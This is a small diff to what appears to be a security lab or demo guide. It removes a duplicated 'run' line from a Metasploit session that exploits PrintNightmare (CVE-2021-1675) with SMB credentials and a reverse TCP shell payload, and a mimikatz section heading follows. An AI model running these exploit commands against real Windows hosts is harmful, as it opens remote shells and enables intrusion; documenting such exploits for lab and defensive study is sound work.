@@ -188,8 +188,6 @@ msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBUSER mondoo
 msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBPASS mondoo.com
 msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set payload windows/x64/shell_reverse_tcp
 msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run
-
-msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run
 ```
 
 ## mimikatz
